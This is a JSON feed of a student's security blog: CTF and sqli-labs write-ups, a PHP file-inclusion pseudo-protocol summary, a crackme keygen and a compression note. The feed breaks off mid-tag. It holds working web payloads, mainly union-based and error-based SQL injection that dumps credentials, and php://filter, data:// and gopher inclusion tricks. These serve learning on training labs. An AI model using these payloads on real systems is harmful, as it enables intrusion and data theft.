{
    "version": "https://jsonfeed.org/version/1",
    "title": "雨落新痕のblog",
    "description": "",
    "home_page_url": "https://mashiro.zone",
    "items": [
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/bmz/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/bmz/",
            "title": "",
            "date_published": "2021-05-19T13:33:48.189Z",
            "content_html": "<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210519213355743.png\" alt=\"image-20210519213355743\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/srff%E6%BC%8F%E6%B4%9E/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/srff%E6%BC%8F%E6%B4%9E/",
            "title": "",
            "date_published": "2021-05-19T12:53:22.700Z",
            "content_html": "<p>ssrf 漏洞的验证</p>\n<p>1.f12 查看是否对其他资源进行了请求</p>\n<p>dnslog 工具</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "",
            "date_published": "2021-05-19T12:00:41.750Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/",
            "title": "",
            "date_published": "2021-05-19T05:33:08.927Z",
            "content_html": "<h1 id=\"php伪协议总结\"><a class=\"anchor\" href=\"#php伪协议总结\">#</a> PHP 伪协议总结</h1>\n<h3 id=\"0x01-简介\"><a class=\"anchor\" href=\"#0x01-简介\">#</a> 0x01 简介</h3>\n<p>首先来看一下有哪些文件包含函数：</p>\n<pre><code>Copyinclude、require、include_once、require_once、highlight_file\nshow_source 、readfile 、file_get_contents 、fopen 、file\n</code></pre>\n<p>有哪些伪协议：</p>\n<pre><code>Copyfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n</code></pre>\n<h3 id=\"0x02-详细解读\"><a class=\"anchor\" href=\"#0x02-详细解读\">#</a> 0x02 详细解读</h3>\n<h4 id=\"21-phpfilter\"><a class=\"anchor\" href=\"#21-phpfilter\">#</a> 2.1 php://filter</h4>\n<p>php://filter 用于读取源码，php://input 用于执行 php 代码</p>\n<pre><code>Copy?page=php://filter/read=convert.base64-encode/resource=../flag.php\n</code></pre>\n<h4 id=\"22-file协议\"><a class=\"anchor\" href=\"#22-file协议\">#</a> 2.2 file:// 协议</h4>\n<p>用于访问本地文件系统，不受 allow_url_fopen 与 allow_url_include 的影响</p>\n<p>即 file:// [文件的绝对路径和文件名]</p>\n<pre><code>Copy?path=file:///var/www/html/flag.txt\n</code></pre>\n<h4 id=\"23-phpinput\"><a class=\"anchor\" href=\"#23-phpinput\">#</a> 2.3 php://input</h4>\n<p>php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行</p>\n<p>php://input 可以用来生成一句话</p>\n<p>利用该方法，我们可以直接写入 php 文件，输入 file=php://input，然后使用 burp 抓包，写入 php 代码：</p>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094417758-1718167573.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094417758-1718167573.png\" alt=\"img\" /></a></p>\n<h4 id=\"24-data协议\"><a class=\"anchor\" href=\"#24-data协议\">#</a> 2.4 data:// 协议</h4>\n<p>利用 data:// 伪协议可以直接达到执行 php 代码的效果，例如执行 phpinfo () 函数：</p>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094507058-1533636706.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094507058-1533636706.png\" alt=\"img\" /></a></p>\n<p>如果此处对特殊字符进行了过滤，我们还可以通过 base64 编码后再输入：</p>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094520213-1015538159.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094520213-1015538159.png\" alt=\"img\" /></a></p>\n<pre><code>Copy?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n</code></pre>\n<h4 id=\"25-zip-bzip2-zlib协议\"><a class=\"anchor\" href=\"#25-zip-bzip2-zlib协议\">#</a> 2.5 zip://, bzip2://, zlib:// 协议</h4>\n<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p>\n<p>如果网站允许我们上传压缩文件，我们也可以将 php 文件压缩后进行上传，再通过 zip:// 协议执行。</p>\n<p>以 DVWA 平台为例，我们将 phpinfo.php 文件进行压缩后上传：</p>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094753714-490113464.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094753714-490113464.png\" alt=\"img\" /></a></p>\n<p>通过 zip:// 协议执行 zip 压缩包中的 phpinfo.php 文件：</p>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094803103-2067821532.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025094803103-2067821532.png\" alt=\"img\" /></a></p>\n<h3 id=\"0x03-总结\"><a class=\"anchor\" href=\"#0x03-总结\">#</a> 0x03 总结</h3>\n<p><a href=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025095141008-73449695.png\"><img data-src=\"https://img2018.cnblogs.com/blog/1561366/201910/1561366-20191025095141008-73449695.png\" alt=\"img\" /></a></p>\n<pre><code>Copypage=dict://127.0.0.1:80 #探测端口开放\npage=gopher://127.0.0.1:6379/payload #对redis服务进行getshell等操作\n</code></pre>\n<p>文件包含漏洞防护:<br />\n1. 使用 str_replace 等方法过滤掉危险字符<br />\n 2. 配置 open_basedir，防止目录遍历<br />\n 3.php 版本升级，防止 %00 截断<br />\n 4. 对上传的文件进行重命名，防止被读取<br />\n 5. 对于动态包含的文件可以设置一个白名单，不读取非白名单的文件<br />\n 6. 做好管理员权限划分，做好文件的权限管理</p>\n<h3 id=\"0x04-参考链接\"><a class=\"anchor\" href=\"#0x04-参考链接\">#</a> 0x04 参考链接</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2owazNyLnRvcC8yMDE4LzA0LzA3L3BocC13eHkv\">http://j0k3r.top/2018/04/07/php-wxy/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01vbnN0ZXJsejEyMy9hcnRpY2xlL2RldGFpbHMvOTM5NjQ5MTY=\">https://blog.csdn.net/Monsterlz123/article/details/93964916</span></p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95/",
            "url": "https://mashiro.zone/%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95/",
            "title": "",
            "date_published": "2021-05-19T02:20:09.696Z",
            "content_html": "<h2 id=\"比huffman算法压缩效率更高的几种算法\"><a class=\"anchor\" href=\"#比huffman算法压缩效率更高的几种算法\">#</a> 比 Huffman 算法压缩效率更高的几种算法</h2>\n<h3 id=\"1-游程编码\"><a class=\"anchor\" href=\"#1-游程编码\">#</a> 1、游程编码</h3>\n<p><strong>游程编码</strong>（英语：run-length encoding，缩写 RLE），又称<strong>行程长度编码</strong>或<strong>变动长度编码法</strong>，是一种与资料性质无关的无损数据压缩技术，基于 “使用变动长度的码来取代连续重复出现的原始资料”，它的原理是通过检测统计数据流中重复的位或字符序列，并用它们出现的次数和每次出现的个数形成新的代码。从而达到数据压缩的目的。</p>\n<p>举例来说，一组资料串 &quot;AAAABBBCCDEEEE&quot;，由 4 个 A、3 个 B、2 个 C、1 个 D、4 个 E 组成，经过<strong>变动长度编码法</strong>可将资料压缩为 4A3B2C1D4E（由 14 个单位转成 10 个单位）。</p>\n<p>简言之，其优点在于将重复性高的资料量压缩成小单位；然而，其缺点在于─若该资料出现频率不高，可能导致压缩结果资料量比原始资料大，例如：原始资料 &quot;ABCDE&quot;，压缩结果为 &quot;1A1B1C1D1E&quot;（由 5 个单位转成 10 个单位）。</p>\n<h3 id=\"整数出现次数表示法\"><a class=\"anchor\" href=\"#整数出现次数表示法\">#</a> 整数（出现次数）表示法</h3>\n<h3 id=\"整数变动长度表示法\"><a class=\"anchor\" href=\"#整数变动长度表示法\">#</a> 整数变动长度表示法</h3>\n<h3 id=\"整数固定长度表示法\"><a class=\"anchor\" href=\"#整数固定长度表示法\">#</a> 整数固定长度表示法</h3>\n<h4 id=\"4位表示法\"><a class=\"anchor\" href=\"#4位表示法\">#</a> 4 位表示法</h4>\n<p>顾名思义，利用 4 个比特来存储整数，以符号 C 表示整数值。其可表现的最大整数值为 15，因此，若资料重复出现次数超过 15，便以 “分段” 方式处理。</p>\n<p>假设某资料出现 N 次，则可以将其分成 (N/15)+1 段落来处理，其中 N/15 的值为无条件舍去。例如连续出现 33 个 A：</p>\n<p>原始资料：</p>\n<p>AAAAAAAAAAAAAAA AAAAAAAAAAAAAAA AAA</p>\n<p>压缩结果：</p>\n<p>15A          15A         3A</p>\n<p>内部存储码：</p>\n<p>1111 01000001 1111 01000001 0011 0100000115   A    15    A     3     A</p>\n<h4 id=\"8位表示法\"><a class=\"anchor\" href=\"#8位表示法\">#</a> 8 位表示法</h4>\n<p>同 4 位表示法的概念，其能表示最大整数为 255。假设某资料出现 N 次，则可以将其分成 (N/255)+1 段落来处理，其中 N/255 的值为无条件舍去。</p>\n<h2 id=\"压缩策略\"><a class=\"anchor\" href=\"#压缩策略\">#</a> 压缩策略</h2>\n<h3 id=\"压缩\"><a class=\"anchor\" href=\"#压缩\">#</a> 压缩</h3>\n<p>先使用一个暂存函数 Q 读取第一个资料，接着将下一个资料与 Q 值比，若资料相同，则计数器加 1；若资料不同，则将计数器存的数值以及 Q 值输出，再初始计数器为，Q 值改为下一个资料。以此类推，完成资料压缩。</p>\n<p>以下为简易的算法：</p>\n<h3 id=\"解压缩\"><a class=\"anchor\" href=\"#解压缩\">#</a> 解压缩</h3>\n<p>其方法为逐一读取整数（以 C 表示）与资料（以 B 表示），将 C 与 B 的二进制码分别转成十进制整数以及原始资料符号，最后输出共 C 次资料 B，即完成一次资料解压缩；接着重复上述步骤，完成所有资料输出。</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/zhengli/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/zhengli/",
            "title": "ctf资源",
            "date_published": "2021-05-18T13:38:02.000Z",
            "content_html": "<p>接触 ctf 有一段时间了原本想利用 rss 来聚合一下自己收集到的不错的学习资源，但是发现不少 rss 订阅器特别麻烦还需要付费，所以就在这篇聚合一下修炼秘籍</p>\n<p>可以学习的地方：github，大佬的 blog，知乎，google，b 站，淘宝，书籍</p>\n<hr />\n<p>-github：</p>\n<p>1、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NIWWJldGEvV2ViLVNlY3VyaXR5LUxlYXJuaW5n\">https://github.com/CHYbeta/Web-Security-Learning</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210518221928087.png\" alt=\"image-20210518221928087\" /></p>\n<p>这个仓库总结了很多从漏洞到渗透到 ctf 等 web 安全方方面面的文章，十分全面</p>\n<p>2、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FuY2hvcmV0WS9BSV9TZWN1cml0eV9MaWJyYXJ5\">https://github.com/AnchoretY/AI_Security_Library</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210518222447966.png\" alt=\"image-20210518222447966\" /></p>\n<p>AI 与 web 安全结合的一些文章，呜呜，虽然看不懂</p>\n<hr />\n<p>- 大佬的 blog：</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%AE%B0%E5%BD%95/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%AE%B0%E5%BD%95/",
            "title": "",
            "date_published": "2021-05-17T15:08:30.412Z",
            "content_html": "<pre><code>&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, &quot;php://&quot;)) &#123;  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);&#125;include($page);?&gt;\n</code></pre>\n<p><strong>Example #1 *<em>strstr()*</em> 范例</strong></p>\n<pre><code>&lt;?php$email = 'name@example.com';$domain = strstr($email, '@');echo $domain; // 打印 @example.com$user = strstr($email, '@', true); // 从 PHP 5.3.0 起echo $user; // 打印 name?&gt; \n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E5%AE%9E%E9%AA%8C%E4%B8%89/",
            "url": "https://mashiro.zone/%E5%AE%9E%E9%AA%8C%E4%B8%89/",
            "title": "",
            "date_published": "2021-05-16T14:35:17.572Z",
            "content_html": "<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210516223542910.png\" alt=\"image-20210516223542910\" /></p>\n<p>地址在 0x4011ec 跳转到那里在把那里识别为函数即可 然后 f5 看伪代码</p>\n<p>接着构造注册机</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> mysum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mysum <span class=\"token operator\">+=</span> <span class=\"token operator\">*</span> temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"serial: %u\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0xffc6e760</span> <span class=\"token operator\">-</span> mysum<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输入</p>\n<p><img data-src=\"C:%5CUsers%5Cyuan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210516232006271.png\" alt=\"image-20210516232006271\" /></p>\n<p>over</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E7%9A%84%E6%95%B4%E7%90%86/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E7%9A%84%E6%95%B4%E7%90%86/",
            "title": "",
            "date_published": "2021-05-16T14:35:12.178Z",
            "content_html": "<p>最近要看的书：深入理解计算机系统，计算机网络</p>\n<p>要看的网课：</p>\n<p>数据结构：</p>\n<p>深入理解计算机系统</p>\n<p>六级！</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E4%BF%AE%E7%82%BC%E7%AC%94%E8%AE%B0/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E4%BF%AE%E7%82%BC%E7%AC%94%E8%AE%B0/",
            "title": "",
            "date_published": "2021-05-15T12:13:58.518Z",
            "content_html": "<p>小白的 sql 注入修炼，参考了各位大佬的博客，感谢</p>\n<p><img data-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200201000748-d3369600-4443-1.png\" alt=\"img\" /></p>\n<h2 id=\"less-1\"><a class=\"anchor\" href=\"#less-1\">#</a> less-1</h2>\n<p>1. 找到注入点，发现报错回显。</p>\n<p><code>?id=1'</code></p>\n<p>看到报错语句。</p>\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n</code></pre>\n<p>用 --+ 或者 %23 注释引号</p>\n<p>发现已经闭合，只要在后面加 --+ 或者 #注释掉后面的部分就可以了。<br />\n2. 猜字段数。</p>\n<p><code>?id=1'order by 3--+</code></p>\n<p>3. 使用联合查询。</p>\n<p><code>?id=-1'union select 1,2,3--+</code></p>\n<p>查询后面 select 查询的信息<br />\n 4. 注入查询基本信息</p>\n<p><code>?id=1'union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+</code></p>\n<p>得到用户名 root@localhost : 数据库 security : 版本信息 5.5.44-0ubuntu0.14.04.1</p>\n<p>这里可以看到是在 security 数据库里面了，但是我们也可以构造一条语句爆出所有的库。<br />\n5. 爆库</p>\n<p>首先说一下 mysql 的数据库 information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br />\n用户权限等信息，下面说一下常用的几个表</p>\n<p>SCHEMATA 表：储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等，show databases 的结果取之此表。</p>\n<p>TABLES 表：储存 mysql 中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname 的结果取之此表</p>\n<p>COLUMNS 表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是 show columns from schemaname.tablename 的结果取之此表。</p>\n<p><code>?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>\n<p>得到数据库</p>\n<p>information_schema,challenges,mysql,performance_schema,security</p>\n<p>6. 爆库 security 的表</p>\n<p><code>?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</code></p>\n<p>ps：table_schema = 后面可以直接加单引号括起的数据库名，也可以是数据库的 16 进制，过滤单引号可用。</p>\n<p>得到 security 数据库的所有表</p>\n<p>emails,referers,uagents,users</p>\n<p>7. 爆 users 列</p>\n<p><code>?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</code></p>\n<p>id,username,password</p>\n<p>8. 爆数据</p>\n<p><code>?id=-1'union select 1,username,password from users where id=2--+</code></p>\n<p>确定注入点以后首先利用 order by 来确定列数</p>\n<p><code>?id=1'order by 3--+</code></p>\n<p>爆库名 (其实另 一种写法不用)</p>\n<p><code>?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210515224620520.png\" alt=\"image-20210515224620520\" /></p>\n<p>爆表名</p>\n<p><code>?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</code></p>\n<p>爆列名</p>\n<p><code>?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</code></p>\n<p>爆记录</p>\n<p><code>?id=-1'union select 1,username,password from users where id=2--+</code></p>\n<h2 id=\"其他做法\"><a class=\"anchor\" href=\"#其他做法\">#</a> 其他做法</h2>\n<p><code>?id=1'order by 3--+</code></p>\n<p>确定该数据库的列数后</p>\n<p><code>?id=-1' union select 1,2,3%23</code></p>\n<p>这种就是先看第几个数是有回显的</p>\n<p>发现第 2，3 个数有回显</p>\n<p>然后进行注入</p>\n<p>user(),database(),version()</p>\n<p><code>?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code></p>\n<p>这里 database 是指当前使用的数据库</p>\n<p>接着</p>\n<p><code>?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3%23</code> <br />\n 得到 users 表下的所有列名</p>\n<p><code>?id=-1' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>\n<h2 id=\"less-2\"><a class=\"anchor\" href=\"#less-2\">#</a> less-2</h2>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524164415822.png\" alt=\"image-20210524164415822\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524165823637.png\" alt=\"image-20210524165823637\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524170023820.png\" alt=\"image-20210524170023820\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524170330219.png\" alt=\"image-20210524170330219\" /></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524170655132.png\" alt=\"image-20210524170655132\" /></p>\n<h2 id=\"less-3\"><a class=\"anchor\" href=\"#less-3\">#</a> less-3</h2>\n<p><code>http://localhost/sqli-labs/Less-3/?id=1')--+</code></p>\n<h2 id=\"less-4\"><a class=\"anchor\" href=\"#less-4\">#</a> less-4</h2>\n<p>无回显报错注入</p>\n<p>1.mid () 函数</p>\n<p>MID(column_name,start[,length])</p>\n<p>如： str=&quot;123456&quot; mid (str,2,1) 结果为 2</p>\n<p>Sql 用例：</p>\n<pre><code>（1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。\n\n（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。\n</code></pre>\n<p>2.substr () 函数</p>\n<p>Substr () 和 substring () 函数实现的功能是一样的，均为截取字符串。</p>\n<p>string substring(string, start, length)</p>\n<p>string substr(string, start, length)</p>\n<p>参数描述同 mid () 函数，第一个参数为要处理的字符串，start 为开始位置，length 为截取的长度。</p>\n<p>Sql 用例：</p>\n<pre><code>(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。\n\n(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。\n</code></pre>\n<p>3.Left () 函数</p>\n<p>Left () 得到字符串左部指定个数的字符</p>\n<p>Left (string, n) string 为要截取的字符串，n 为长度。</p>\n<p>Sql 用例：</p>\n<pre><code>(1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。\n\n(2) 同样的string可以为自行构造的sql语句。\n</code></pre>\n<p>参考 ：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpa2U5OGsvYXJ0aWNsZS9kZXRhaWxzLzc5NDM2NDYz\">https://blog.csdn.net/like98k/article/details/79436463</span></p>\n<p><img data-src=\"https://cdn.jsdelivr.net/gh/yuanoes/imagehost@main/pic/image-20210524201735946.png\" alt=\"image-20210524201735946\" /></p>\n<p>盲注脚本法</p>\n<p>报错注入法</p>\n<p>(1). 通过 floor 报错<br />\n and (select 1 from (select count (*),concat ((payload),floor (rand (0)*2)) x from information_schema.tables group by x) a)<br />\n 其中 payload 为你要插入的 SQL 语句<br />\n需要注意的是该语句将 输出字符长度限制为 64 个字符</p>\n<p>(2). 通过 updatexml 报错<br />\n and updatexml (1,payload,1)<br />\n 同样该语句对输出的字符长度也做了限制，其最长输出 32 位<br />\n并且该语句对 payload 的反悔类型也做了限制，只有在 payload 返回的不是 xml 格式才会生效</p>\n<p>(3). 通过 ExtractValue 报错<br />\n and extractvalue (1, payload)<br />\n 输出字符有长度限制，最长 32 位。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xvY2FsaG9zdC9zcWxpLWxhYnMvTGVzcy01Lz9pZD0xJ2FuZA==\">http://localhost/sqli-labs/Less-5/?id=1'and</span> left(version(),1)=5--+</p>\n<p>得到版本号为 5 开头</p>\n<p><em>?id=1'and length(database())=8--+</em></p>\n<p>数据库长度为 8</p>\n<p><strong>一、concat（）函数</strong></p>\n<p>1、mysql 的 Concat 函数可以连接一个或多个字符串</p>\n<p>select concat('10');//10</p>\n<p>select concat('11','22','33');//112233</p>\n<p>但是 Oracle 的 concat 函数只能连接两个字符串，不能多也不能少</p>\n<p>select concat('11','22') from dual;</p>\n<p>2、mysql 的 Concat 函数再连接字符串的时候，只要其中一个是 null，南无返回就是 null</p>\n<p>select concat('11','22',null);//null</p>\n<p>而 Oracle 的 concat 函数连接的时候，只要有一个字符串不是 NULL, 就不会返回 NULL</p>\n<p>select concat('11',NULL) from dual;//11</p>\n<p><strong>二、<span class=\"exturl\" data-url=\"aHR0cDovL2NvbmNhdC53cw==\">concat.ws</span> () 函数</strong></p>\n<p>表示 concat with separator, 即有分隔符的字符串连接</p>\n<p>select concat_ws(',','11','22','33');//11,22,33</p>\n<p>select concat_ws('|','11','22','33');//11|22|33</p>\n<p>select concat_ws('<em>','11','22',NULL);//11</em>22</p>\n<p>和 concat 不同的是，concat_ws 函数在执行的时候，不会因为 NULL 值而返回 NULL</p>\n<p><strong>三、group_concat ()</strong></p>\n<p>*****<strong> 必须将 group by 按照什么东西排序，也打印出来；否则函数不起作用</strong></p>\n<p>可用来行转列</p>\n<p>爆基本信息</p>\n<p><code>?id=1' and updatexml(1,concat(0x7e,(select  concat_ws(':',database(),version(),user())),0x7e),1)--+</code></p>\n<p>相当于报错注入的模板为</p>\n<p><code>?id=1' and updatexml(1,concat(0x7e,(sql语句),0x7e),1)--+</code></p>\n<p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata )),0x7e,1)--+</code></p>\n<p>查询当前库的所有表：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWwtbGFicy9sZXNzLTUvP2lkPTE=\">http://127.0.0.1/sql-labs/less-5/?id=1</span>' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where<br />\ntable_schema=database())),1)--+</p>\n<p>查询 users 表中的所有字段：<br />\n<span class=\"exturl\" 